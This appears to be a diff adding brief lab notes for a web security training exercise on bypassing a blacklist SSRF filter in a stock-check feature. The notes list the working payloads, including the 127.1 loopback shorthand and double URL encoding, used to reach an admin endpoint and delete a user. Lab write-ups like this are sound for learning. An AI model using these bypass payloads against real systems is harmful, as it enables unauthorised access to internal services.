@@ -1,0 +1,15 @@
+SSRF with blacklist-based input filter
+Vulnerable - stock check functionality
+Goal: change the stock URL to access the admin interface at http://localhost/admin and delete carlos
+
+1)
+-Check stock
+-Send Post to repeater
+-stockApi=http://127.0.0.1 - blocked
+-stockApi=http://127.1 - works (decimal does too)
+-stockAPI=http://127.1/admin - blocked
+-stockAPI=http://127.1/
+-stockApi=http://127.1/%61dmin - url encoded a, blocked
+-stockApi=http://127.1/%25%36%31dmin - double url encoded a works
+-stockApi=http://127.1/%25%36%31dmin/delete?username=carlos
+->Carol deleted
